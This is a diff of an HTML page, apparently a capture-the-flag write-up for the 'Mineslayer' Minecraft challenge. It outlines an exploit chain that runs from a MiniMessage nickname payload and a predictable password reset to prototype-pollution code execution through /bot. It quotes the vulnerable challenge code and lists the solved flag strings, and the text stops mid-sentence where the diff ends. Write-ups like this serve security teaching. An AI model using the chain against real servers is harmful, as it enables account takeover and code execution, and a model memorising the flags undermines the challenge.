@@ -16,7 +16,7 @@
         <link rel="prev" href="../blackbank/">
       
       
-        <link rel="next" href="../mineslayer-flag2/">
+        <link rel="next" href="../../asis-ctf/sanchess/">
       
       
         
@@ -733,10 +733,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#challenge-overview" class="md-nav__link">
+  <a href="#why-this-was-really-one-chain" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Challenge Overview
+        Why this was really one chain
       
     </span>
   </a>
@@ -755,22 +755,22 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#key-bugs" class="md-nav__link">
+  <a href="#part-1-taking-over-administrator" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Key Bugs
+        Part 1: Taking over Administrator
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Key Bugs">
+    <nav class="md-nav" aria-label="Part 1: Taking over Administrator">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#1-nick-filtering-only-blocked-some-minimessage-tags" class="md-nav__link">
+  <a href="#why-renew-mattered" class="md-nav__link">
     <span class="md-ellipsis">
       
-        1. Nick filtering only blocked some MiniMessage tags
+        Why /renew mattered
       
     </span>
   </a>
@@ -778,10 +778,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#2-the-helper-bot-trusted-parsed-chat-sender-names" class="md-nav__link">
+  <a href="#payload-1-xcadministrator" class="md-nav__link">
     <span class="md-ellipsis">
       
-        2. The helper bot trusted parsed chat sender names
+        Payload 1: x&lt;c:Administrator&gt;
       
     </span>
   </a>
@@ -789,10 +789,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#3-password-resets-were-predictable" class="md-nav__link">
+  <a href="#why-password-prediction-worked" class="md-nav__link">
     <span class="md-ellipsis">
       
-        3. Password resets were predictable
+        Why password prediction worked
       
     </span>
   </a>
@@ -800,10 +800,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#4-bot-was-obviously-dangerous" class="md-nav__link">
+  <a href="#result-of-part-1" class="md-nav__link">
     <span class="md-ellipsis">
       
-        4. /bot was obviously dangerous
+        Result of part 1
       
     </span>
   </a>
@@ -816,10 +816,132 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#flag_1-admin-account-takeover" class="md-nav__link">
+  <a href="#part-2-turning-bot-into-rce" class="md-nav__link">
     <span class="md-ellipsis">
       
-        FLAG_1: Admin Account Takeover
+        Part 2: Turning /bot into RCE
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Part 2: Turning /bot into RCE">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#why-flag_2-needed-a-different-primitive" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why FLAG_2 needed a different primitive
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-bot-was-a-json-injection-sink" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why /bot was a JSON injection sink
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#what-the-injected-config-looked-like" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What the injected config looked like
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-the-node-merge-made-prototype-pollution-reachable" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why the Node merge made prototype pollution reachable
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-final-bot-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The final /bot payload
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="The final /bot payload">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#why-__proto__0-matters" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why "__proto__":{"0":"(...)"} matters
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-the-usernameconstructorprototype-pollution-is-also-required" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why the username.constructor.prototype pollution is also required
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-version1218-is-present" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why "version":"1.21.8" is present
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-xb-is-needed" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why "x":["b" is needed
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#why-code-generation-was-the-winning-gadget" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why code generation was the winning gadget
       
     </span>
   </a>
@@ -827,10 +949,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#predicted-password-sequence" class="md-nav__link">
+  <a href="#end-to-end-chain" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Predicted Password Sequence
+        End-to-end chain
       
     </span>
   </a>
@@ -838,10 +960,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#result" class="md-nav__link">
+  <a href="#final-result" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Result
+        Final result
       
     </span>
   </a>
@@ -849,10 +971,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#follow-up" class="md-nav__link">
+  <a href="#takeaways" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Follow-up
+        Takeaways
       
     </span>
   </a>
@@ -863,34 +985,6 @@
   
 </nav>
       
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../mineslayer-flag2/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Mineslayer — Flag 2
-  
-
-    
-  </span>
-  
-  
-
-      </a>
     </li>
   
 
@@ -2238,10 +2332,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#challenge-overview" class="md-nav__link">
+  <a href="#why-this-was-really-one-chain" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Challenge Overview
+        Why this was really one chain
       
     </span>
   </a>
@@ -2260,22 +2354,22 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#key-bugs" class="md-nav__link">
+  <a href="#part-1-taking-over-administrator" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Key Bugs
+        Part 1: Taking over Administrator
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Key Bugs">
+    <nav class="md-nav" aria-label="Part 1: Taking over Administrator">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#1-nick-filtering-only-blocked-some-minimessage-tags" class="md-nav__link">
+  <a href="#why-renew-mattered" class="md-nav__link">
     <span class="md-ellipsis">
       
-        1. Nick filtering only blocked some MiniMessage tags
+        Why /renew mattered
       
     </span>
   </a>
@@ -2283,10 +2377,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#2-the-helper-bot-trusted-parsed-chat-sender-names" class="md-nav__link">
+  <a href="#payload-1-xcadministrator" class="md-nav__link">
     <span class="md-ellipsis">
       
-        2. The helper bot trusted parsed chat sender names
+        Payload 1: x&lt;c:Administrator&gt;
       
     </span>
   </a>
@@ -2294,10 +2388,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#3-password-resets-were-predictable" class="md-nav__link">
+  <a href="#why-password-prediction-worked" class="md-nav__link">
     <span class="md-ellipsis">
       
-        3. Password resets were predictable
+        Why password prediction worked
       
     </span>
   </a>
@@ -2305,10 +2399,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#4-bot-was-obviously-dangerous" class="md-nav__link">
+  <a href="#result-of-part-1" class="md-nav__link">
     <span class="md-ellipsis">
       
-        4. /bot was obviously dangerous
+        Result of part 1
       
     </span>
   </a>
@@ -2321,10 +2415,132 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#flag_1-admin-account-takeover" class="md-nav__link">
+  <a href="#part-2-turning-bot-into-rce" class="md-nav__link">
     <span class="md-ellipsis">
       
-        FLAG_1: Admin Account Takeover
+        Part 2: Turning /bot into RCE
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Part 2: Turning /bot into RCE">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#why-flag_2-needed-a-different-primitive" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why FLAG_2 needed a different primitive
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-bot-was-a-json-injection-sink" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why /bot was a JSON injection sink
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#what-the-injected-config-looked-like" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What the injected config looked like
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-the-node-merge-made-prototype-pollution-reachable" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why the Node merge made prototype pollution reachable
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-final-bot-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The final /bot payload
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="The final /bot payload">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#why-__proto__0-matters" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why "__proto__":{"0":"(...)"} matters
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-the-usernameconstructorprototype-pollution-is-also-required" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why the username.constructor.prototype pollution is also required
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-version1218-is-present" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why "version":"1.21.8" is present
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-xb-is-needed" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why "x":["b" is needed
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#why-code-generation-was-the-winning-gadget" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why code generation was the winning gadget
       
     </span>
   </a>
@@ -2332,10 +2548,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#predicted-password-sequence" class="md-nav__link">
+  <a href="#end-to-end-chain" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Predicted Password Sequence
+        End-to-end chain
       
     </span>
   </a>
@@ -2343,10 +2559,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#result" class="md-nav__link">
+  <a href="#final-result" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Result
+        Final result
       
     </span>
   </a>
@@ -2354,10 +2570,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#follow-up" class="md-nav__link">
+  <a href="#takeaways" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Follow-up
+        Takeaways
       
     </span>
   </a>
@@ -2430,118 +2646,345 @@
 
 
 <h1 id="mineslayer">Mineslayer<a class="headerlink" href="#mineslayer" title="Permanent link">&para;</a></h1>
-<p><strong>Flags:</strong> <code>FLAG_1</code> solved, <code>FLAG_2</code> documented separately in <a href="../mineslayer-flag2/">the full follow-up writeup</a></p>
-<h2 id="challenge-overview">Challenge Overview<a class="headerlink" href="#challenge-overview" title="Permanent link">&para;</a></h2>
-<p>Mineslayer is a Minecraft-based challenge built around a Paper server, a privileged helper bot, and a second bot launched through a vulnerable <code>/bot</code> command. The first flag came from abusing how three different components interpreted nicknames and chat messages. The second flag depended on turning the bot configuration bug into real code execution.</p>
-<h2 id="architecture">Architecture<a class="headerlink" href="#architecture" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>+-------------------+       +-------------------+
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>|   Paper Server    |       |   Admin Bot       |
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>|   (Java, 1.21.8)  |&lt;-----&gt;|   (Node.js)       |
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>|                   |       |   username:       |
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>|  Plugins:         |       |   Administrator   |
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>|  - Mineslayer     |       +-------------------+
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>|  - SimpleNicks    |
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>|  - AuthMe         |       +-------------------+
-</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>|  - LuckPerms      |       |  Mineslayer Bot   |
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>|                   |       |  (Node.js)        |
-</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>|  /getflag (SUID)  |       |  spawned by /bot  |
-</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>|  /root/flag.txt   |       +-------------------+
-</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>+-------------------+
+<p><strong>Flags:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>FLAG_1: MCTF{M1ni_M3ssage_N3st1ng_g0es_H4rd}
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>FLAG_1 (revenge): MCTF{W1ll_Y0u_F1nd_4n0th3r_Byp4ss??}
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>FLAG_2: MCTF{Th4ts_4_sh1t_t0n_0f_g4dg3t}
 </span></code></pre></div>
-<p>The important pieces were:</p>
+<h2 id="why-this-was-really-one-chain">Why this was really one chain<a class="headerlink" href="#why-this-was-really-one-chain" title="Permanent link">&para;</a></h2>
+<p>I had originally treated Mineslayer as two writeups, but the challenge makes more sense as one continuous chain:</p>
+<ol>
+<li>abuse the helper bot to force a password reset on <code>Administrator</code></li>
+<li>predict the new admin password</li>
+<li>log in as the re-op'd admin account</li>
+<li>use <code>/bot</code> as a JSON injection sink</li>
+<li>turn that into prototype pollution inside the Node bot process</li>
+<li>reach a code-generation path that executes <code>/getflag</code></li>
+</ol>
+<p>The first flag was the proof that the helper-bot side was exploitable. The second flag was the real finish.</p>
+<h2 id="architecture">Architecture<a class="headerlink" href="#architecture" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>+-------------------+       +-------------------+
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>|   Paper Server    |       |   Admin Bot       |
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>|   (Java, 1.21.8)  |&lt;-----&gt;|   (Node.js)       |
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>|                   |       |   username:       |
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>|  Plugins:         |       |   Administrator   |
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>|  - Mineslayer     |       +-------------------+
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>|  - SimpleNicks    |
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>|  - AuthMe         |       +-------------------+
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>|  - LuckPerms      |       |  Mineslayer Bot   |
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>|                   |       |  (Node.js)        |
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>|  /getflag (SUID)  |       |  spawned by /bot  |
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>|  /root/flag.txt   |       +-------------------+
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>+-------------------+
+</span></code></pre></div>
+<p>The important moving parts were:</p>
 <ul>
 <li>the nickname filter in the Paper plugin</li>
-<li>the helper bot that reacts to URLs in chat</li>
+<li>the helper bot that watches chat for URLs</li>
 <li>the deterministic password reset logic</li>
-<li>the <code>/bot</code> command that serializes attacker-controlled input into JSON</li>
+<li>the admin-only <code>/bot</code> command</li>
+<li>the Node bot's unsafe recursive merge</li>
+<li>the protocol compiler behind mineflayer / protodef</li>
 </ul>
-<h2 id="key-bugs">Key Bugs<a class="headerlink" href="#key-bugs" title="Permanent link">&para;</a></h2>
-<h3 id="1-nick-filtering-only-blocked-some-minimessage-tags">1. Nick filtering only blocked some MiniMessage tags<a class="headerlink" href="#1-nick-filtering-only-blocked-some-minimessage-tags" title="Permanent link">&para;</a></h3>
-<p>The plugin stripped a small set of dangerous tags, but color tags were left alone:</p>
-<div class="language-java highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">MiniMessage</span><span class="w"> </span><span class="n">UNSAFE_TAG_STRIPPER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MiniMessage</span><span class="p">.</span><span class="na">builder</span><span class="p">()</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">    </span><span class="p">.</span><span class="na">tags</span><span class="p">(</span><span class="n">TagResolver</span><span class="p">.</span><span class="na">builder</span><span class="p">()</span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">        </span><span class="p">.</span><span class="na">resolvers</span><span class="p">(</span>
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">translatable</span><span class="p">(),</span>
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">clickEvent</span><span class="p">(),</span>
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">hoverEvent</span><span class="p">(),</span>
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">insertion</span><span class="p">(),</span>
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">font</span><span class="p">(),</span>
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">selector</span><span class="p">(),</span>
-</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">keybind</span><span class="p">(),</span>
-</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">score</span><span class="p">(),</span>
-</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">nbt</span><span class="p">(),</span>
-</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="w">            </span><span class="n">StandardTags</span><span class="p">.</span><span class="na">newline</span><span class="p">()</span>
-</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="w">        </span><span class="p">)</span>
-</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="w">        </span><span class="p">.</span><span class="na">build</span><span class="p">())</span>
-</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="w">    </span><span class="p">.</span><span class="na">build</span><span class="p">();</span>
-</span></code></pre></div>
-<p>That meant payloads like <code>x&lt;c:Administrator&gt;</code> survived the filter.</p>
-<h3 id="2-the-helper-bot-trusted-parsed-chat-sender-names">2. The helper bot trusted parsed chat sender names<a class="headerlink" href="#2-the-helper-bot-trusted-parsed-chat-sender-names" title="Permanent link">&para;</a></h3>
-<p>When the bot saw a URL, it looked up the sender and then issued a password reset:</p>
-<div class="language-javascript highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">urlRegex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/(https?:\/\/[^\s]+)/i</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="kd">let</span><span class="w"> </span><span class="nx">targetUsername</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
+<h2 id="part-1-taking-over-administrator">Part 1: Taking over <code>Administrator</code><a class="headerlink" href="#part-1-taking-over-administrator" title="Permanent link">&para;</a></h2>
+<h3 id="why-renew-mattered">Why <code>/renew</code> mattered<a class="headerlink" href="#why-renew-mattered" title="Permanent link">&para;</a></h3>
+<p>The command that made the whole challenge crack open was <code>/renew</code>. Once I read the server-side logic, the real goal was obvious:</p>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">String</span><span class="w"> </span><span class="n">newPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PasswordUtil</span><span class="p">.</span><span class="na">generate</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">authMeApi</span><span class="p">.</span><span class="na">changePassword</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">newPassword</span><span class="p">);</span>
 </span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="nx">bot</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;chat&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">message</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">urlRegex</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">message</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">    </span><span class="nx">targetUsername</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">username</span>
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">    </span><span class="nx">bot</span><span class="p">.</span><span class="nx">chat</span><span class="p">(</span><span class="sb">`/nick who </span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">    </span><span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">      </span><span class="nx">bot</span><span class="p">.</span><span class="nx">chat</span><span class="p">(</span><span class="sb">`/renew </span><span class="si">${</span><span class="nx">targetUsername</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
-</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="w">    </span><span class="p">},</span><span class="w"> </span><span class="mf">300</span><span class="p">)</span>
-</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="w">  </span><span class="p">}</span>
-</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="p">})</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">Player</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Bukkit</span><span class="p">.</span><span class="na">getPlayerExact</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">target</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">target</span><span class="p">.</span><span class="na">isOnline</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">    </span><span class="n">target</span><span class="p">.</span><span class="na">kick</span><span class="p">(</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">        </span><span class="n">Component</span><span class="p">.</span><span class="na">text</span><span class="p">(</span><span class="s">&quot;You&#39;ve been flagged as a bot user.\n\n&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">NamedTextColor</span><span class="p">.</span><span class="na">RED</span><span class="p">)</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">            </span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">Component</span><span class="p">.</span><span class="na">text</span><span class="p">(</span><span class="s">&quot;Please login again using this password:\n\n&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">NamedTextColor</span><span class="p">.</span><span class="na">GRAY</span><span class="p">))</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">            </span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">Component</span><span class="p">.</span><span class="na">text</span><span class="p">(</span><span class="n">newPassword</span><span class="p">,</span><span class="w"> </span><span class="n">NamedTextColor</span><span class="p">.</span><span class="na">WHITE</span><span class="p">)));</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="p">}</span>
 </span></code></pre></div>
-<p>Because the nick payload rendered differently across the server, SimpleNicks, and the bot's parser, I could make the helper treat my message as if it came from <code>Administrator</code>.</p>
-<h3 id="3-password-resets-were-predictable">3. Password resets were predictable<a class="headerlink" href="#3-password-resets-were-predictable" title="Permanent link">&para;</a></h3>
-<p>The plugin generated passwords with <code>java.util.Random</code> seeded from the world seed:</p>
